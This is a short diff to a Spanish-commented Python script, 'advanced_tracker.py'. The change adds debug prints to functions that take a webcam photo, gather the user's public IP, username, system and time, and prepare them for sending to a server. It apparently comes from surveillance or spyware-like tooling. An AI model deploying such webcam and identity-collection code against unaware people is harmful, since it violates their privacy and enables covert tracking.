@@ -1,4 +1,4 @@
-# advanced_tracker.py (versión final corregida)
+# advanced_tracker.py (versión final corregida con depuración adicional)
 import requests
 import platform
 import getpass
@@ -29,9 +29,14 @@ def recolectar_info():
     except Exception as e:
         print("⚠️ No se pudo obtener IP pública:", e)
         ip_publica = 'No obtenido'
+    
     usuario = getpass.getuser()
     sistema = f"{platform.system()} {platform.release()}"
     hora = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    
+    # Impresión de depuración para verificar los datos recolectados
+    print(f"📥 Información recolectada: IP: {ip_publica}, Usuario: {usuario}, Sistema: {sistema}, Hora: {hora}")
+    
     return {
         'ip': ip_publica,
         'usuario': usuario,
@@ -42,7 +47,9 @@ def recolectar_info():
 def enviar_reporte():
     capturar_webcam('webcam.jpg')
     info = recolectar_info()
-    print("📤 Datos recolectados:")
+
+    # Impresión de depuración para verificar los datos que se van a enviar
+    print("📤 Datos a enviar al servidor:")
     for k, v in info.items():
         print(f"  {k}: {v}")
 
